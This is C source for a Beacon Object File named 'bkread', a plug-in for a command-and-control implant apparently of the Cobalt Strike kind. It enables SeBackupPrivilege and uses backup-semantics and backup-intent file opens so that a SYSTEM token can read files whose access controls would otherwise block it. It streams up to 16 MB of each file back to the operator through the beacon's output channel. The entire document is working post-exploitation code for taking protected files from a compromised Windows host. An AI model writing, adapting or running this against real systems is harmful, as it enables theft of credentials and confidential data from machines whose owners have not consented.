#include <windows.h>
#include "beacon.h"

/*
 * bkread BOF
 *
 * Reads a file with SeBackupPrivilege and FILE_FLAG_BACKUP_SEMANTICS so a
 * SYSTEM token can bypass restrictive DACLs without changing ownership or ACLs.
 */

#define MAX_PATH_CHARS 1024
#define CHUNK_SIZE 32768
#define MAX_BYTES_HARD_LIMIT 16777216

typedef struct _OPEN_ATTEMPT {
    const char* label;
    DWORD desiredAccess;
    DWORD flagsAndAttributes;
    HANDLE handle;
    DWORD error;
    NTSTATUS ntstatus;
} OPEN_ATTEMPT;

int WideCharToUtf8(LPCWSTR wide, char* buffer, int bufferSize) {
    int i = 0;
    int j = 0;

    while (wide[i] && j < bufferSize - 1) {
        if (wide[i] < 0x80) {
            buffer[j++] = (char)wide[i];
        } else if (wide[i] < 0x800) {
            if (j + 1 >= bufferSize - 1) {
                break;
            }
            buffer[j++] = 0xC0 | (wide[i] >> 6);
            buffer[j++] = 0x80 | (wide[i] & 0x3F);
        } else {
            if (j + 2 >= bufferSize - 1) {
                break;
            }
            buffer[j++] = 0xE0 | (wide[i] >> 12);
            buffer[j++] = 0x80 | ((wide[i] >> 6) & 0x3F);
            buffer[j++] = 0x80 | (wide[i] & 0x3F);
        }
        i++;
    }

    buffer[j] = '\0';
    return j;
}

BOOL SetPrivilegeState(LPCWSTR privilegeName, BOOL enable, DWORD* errorOut) {
    HANDLE token = NULL;
    TOKEN_PRIVILEGES privileges;
    LUID luid;
    DWORD lastError;

    if (errorOut) {
        *errorOut = ERROR_SUCCESS;
    }

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token)) {
        if (errorOut) {
            *errorOut = GetLastError();
        }
        return FALSE;
    }

    if (!LookupPrivilegeValueW(NULL, privilegeName, &luid)) {
        if (errorOut) {
            *errorOut = GetLastError();
        }
        CloseHandle(token);
        return FALSE;
    }

    memset(&privileges, 0, sizeof(privileges));
    privileges.PrivilegeCount = 1;
    privileges.Privileges[0].Luid = luid;
    privileges.Privileges[0].Attributes = enable ? SE_PRIVILEGE_ENABLED : 0;

    if (!AdjustTokenPrivileges(token, FALSE, &privileges, sizeof(privileges), NULL, NULL)) {
        if (errorOut) {
            *errorOut = GetLastError();
        }
        CloseHandle(token);
        return FALSE;
    }

    lastError = GetLastError();
    if (errorOut) {
        *errorOut = lastError;
    }
    CloseHandle(token);

    return lastError == ERROR_SUCCESS;
}

void PrintOpenAttemptResult(const OPEN_ATTEMPT* attempt) {
    if (attempt->handle != INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_OUTPUT,
                     "[+] Open probe '%s' succeeded\n",
                     attempt->label);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT,
                     "[-] Open probe '%s' failed: %lu (0x%08lx)\n",
                     attempt->label,
                     attempt->error,
                     attempt->error);
        if (attempt->ntstatus != 0) {
            BeaconPrintf(CALLBACK_OUTPUT,
                         "    NTSTATUS: 0x%08lx\n",
                         attempt->ntstatus);
        }
    }
}

BOOL NativeBackupOpen(LPCWSTR targetPath, OPEN_ATTEMPT* attempt) {
    WCHAR nativePath[MAX_PATH_CHARS];
    UNICODE_STRING objectName;
    OBJECT_ATTRIBUTES objectAttributes;
    IO_STATUS_BLOCK ioStatusBlock;
    NTSTATUS status;

    if (_snwprintf(nativePath, MAX_PATH_CHARS, L"\\??\\%s", targetPath) < 0) {
        attempt->handle = INVALID_HANDLE_VALUE;
        attempt->error = ERROR_BUFFER_OVERFLOW;
        attempt->ntstatus = 0;
        return FALSE;
    }

    RtlInitUnicodeString(&objectName, nativePath);
    InitializeObjectAttributes(&objectAttributes, &objectName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NtCreateFile(&attempt->handle,
                          FILE_READ_DATA | FILE_READ_ATTRIBUTES | READ_CONTROL | SYNCHRONIZE,
                          &objectAttributes,
                          &ioStatusBlock,
                          NULL,
                          FILE_ATTRIBUTE_NORMAL,
                          FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                          FILE_OPEN,
                          FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT | FILE_OPEN_FOR_BACKUP_INTENT,
                          NULL,
                          0);
    attempt->ntstatus = status;
    attempt->error = (DWORD)status;
    return status >= 0;
}

void go(char* args, int len) {
    datap parser;
    wchar_t* targetPath;
    int maxBytes;
    DWORD attributes;
    char pathUtf8[MAX_PATH_CHARS * 3];
    HANDLE hFile = INVALID_HANDLE_VALUE;
    HANDLE heap = NULL;
    char* chunk = NULL;
    LARGE_INTEGER fileSize;
    DWORD bytesRemaining;
    DWORD totalRead = 0;
    BOOL truncated = FALSE;
    BOOL sawOutput = FALSE;
    BOOL privilegeEnabled = FALSE;
    char lastByte = '\0';
    DWORD privilegeError = ERROR_SUCCESS;
    OPEN_ATTEMPT attempts[4];
    int i;

    BeaconDataParse(&parser, args, len);
    targetPath = (wchar_t*)BeaconDataExtract(&parser, NULL);
    maxBytes = BeaconDataInt(&parser);

    if (!targetPath || lstrlenW(targetPath) == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Path cannot be empty\n");
        return;
    }

    if (WideCharToUtf8(targetPath, pathUtf8, sizeof(pathUtf8)) <= 0) {
        _snprintf(pathUtf8, sizeof(pathUtf8), "<path-conversion-failed>");
    }

    if (maxBytes <= 0 || maxBytes > MAX_BYTES_HARD_LIMIT) {
        BeaconPrintf(CALLBACK_ERROR,
                     "[-] Invalid max-bytes value: %d (allowed range: 1-%d)\n",
                     maxBytes,
                     MAX_BYTES_HARD_LIMIT);
        return;
    }

    attributes = GetFileAttributesW(targetPath);
    if (attributes == INVALID_FILE_ATTRIBUTES) {
        BeaconPrintf(CALLBACK_ERROR,
                     "[-] GetFileAttributesW failed for %s: %lu\n",
                     pathUtf8,
                     GetLastError());
        return;
    }

    if (attributes & FILE_ATTRIBUTE_DIRECTORY) {
        BeaconPrintf(CALLBACK_ERROR,
                     "[-] Directory targets are not supported yet: %s\n",
                     pathUtf8);
        return;
    }

    if (!SetPrivilegeState(L"SeBackupPrivilege", TRUE, &privilegeError)) {
        BeaconPrintf(CALLBACK_ERROR,
                     "[-] Failed to enable SeBackupPrivilege: %lu\n",
                     privilegeError);
        return;
    }
    privilegeEnabled = TRUE;

    memset(attempts, 0, sizeof(attempts));

    attempts[0].label = "backup-semantics read";
    attempts[0].desiredAccess = GENERIC_READ;
    attempts[0].flagsAndAttributes = FILE_FLAG_BACKUP_SEMANTICS;
    attempts[1].label = "plain read";
    attempts[1].desiredAccess = GENERIC_READ;
    attempts[1].flagsAndAttributes = 0;
    attempts[2].label = "metadata-only read";
    attempts[2].desiredAccess = FILE_READ_ATTRIBUTES | READ_CONTROL;
    attempts[2].flagsAndAttributes = FILE_FLAG_BACKUP_SEMANTICS;
    attempts[3].label = "native backup-intent read";
    attempts[3].handle = INVALID_HANDLE_VALUE;

    for (i = 0; i < 3; i++) {
        attempts[i].handle = INVALID_HANDLE_VALUE;
        attempts[i].handle = CreateFileW(targetPath,
                                         attempts[i].desiredAccess,
                                         FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                                         NULL,
                                         OPEN_EXISTING,
                                         attempts[i].flagsAndAttributes,
                                         NULL);
        attempts[i].error = (attempts[i].handle == INVALID_HANDLE_VALUE) ? GetLastError() : ERROR_SUCCESS;
        attempts[i].ntstatus = 0;
    }
    NativeBackupOpen(targetPath, &attempts[3]);

    hFile = attempts[3].handle != INVALID_HANDLE_VALUE ? attempts[3].handle : attempts[0].handle;
    if (hFile == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR,
                     "[-] Primary open failed for %s\n",
                     pathUtf8);
        BeaconPrintf(CALLBACK_OUTPUT,
                     "[+] Attributes: 0x%08lx\n",
                     attributes);
        for (i = 0; i < 4; i++) {
            PrintOpenAttemptResult(&attempts[i]);
            if (attempts[i].handle != INVALID_HANDLE_VALUE) {
                CloseHandle(attempts[i].handle);
                attempts[i].handle = INVALID_HANDLE_VALUE;
            }
        }
        return;
    }
    if (hFile == attempts[0].handle) {
        attempts[0].handle = INVALID_HANDLE_VALUE;
    } else if (hFile == attempts[3].handle) {
        attempts[3].handle = INVALID_HANDLE_VALUE;
    }

    if (!GetFileSizeEx(hFile, &fileSize)) {
        BeaconPrintf(CALLBACK_ERROR,
                     "[-] GetFileSizeEx failed for %s: %lu\n",
                     pathUtf8,
                     GetLastError());
        goto cleanup;
    }

    if (fileSize.QuadPart < 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Invalid file size for %s\n", pathUtf8);
        goto cleanup;
    }

    bytesRemaining = (DWORD)fileSize.QuadPart;
    if (fileSize.QuadPart > maxBytes) {
        bytesRemaining = (DWORD)maxBytes;
        truncated = TRUE;
    }

    heap = GetProcessHeap();
    chunk = (char*)HeapAlloc(heap, HEAP_ZERO_MEMORY, CHUNK_SIZE);
    if (!chunk) {
        BeaconPrintf(CALLBACK_ERROR, "[-] HeapAlloc failed\n");
        goto cleanup;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Reading: %s\n", pathUtf8);
    BeaconPrintf(CALLBACK_OUTPUT,
                 "[+] File size: %lu bytes%s\n",
                 (DWORD)fileSize.QuadPart,
                 (attributes & FILE_ATTRIBUTE_ENCRYPTED) ? " (EFS attribute set)" : "");
    if (truncated) {
        BeaconPrintf(CALLBACK_OUTPUT,
                     "[!] Streaming first %d bytes due to max-bytes limit\n",
                     maxBytes);
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] BEGIN CONTENT\n");

    while (bytesRemaining > 0) {
        DWORD chunkRequest = bytesRemaining > CHUNK_SIZE ? CHUNK_SIZE : bytesRemaining;
        DWORD chunkRead = 0;

        if (!ReadFile(hFile, chunk, chunkRequest, &chunkRead, NULL)) {
            BeaconPrintf(CALLBACK_ERROR,
                         "\n[-] ReadFile failed after %lu bytes: %lu\n",
                         totalRead,
                         GetLastError());
            goto cleanup;
        }

        if (chunkRead == 0) {
            break;
        }

        BeaconOutput(CALLBACK_OUTPUT, chunk, chunkRead);
        lastByte = chunk[chunkRead - 1];
        sawOutput = TRUE;
        totalRead += chunkRead;
        bytesRemaining -= chunkRead;
    }

    if (!sawOutput || lastByte != '\n') {
        BeaconPrintf(CALLBACK_OUTPUT, "\n");
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] END CONTENT\n");

cleanup:
    for (i = 0; i < 4; i++) {
        if (attempts[i].handle != INVALID_HANDLE_VALUE) {
            CloseHandle(attempts[i].handle);
        }
    }
    if (privilegeEnabled) {
        SetPrivilegeState(L"SeBackupPrivilege", FALSE, NULL);
    }
    if (chunk) {
        HeapFree(heap, 0, chunk);
    }
    if (hFile != INVALID_HANDLE_VALUE) {
        CloseHandle(hFile);
    }
}
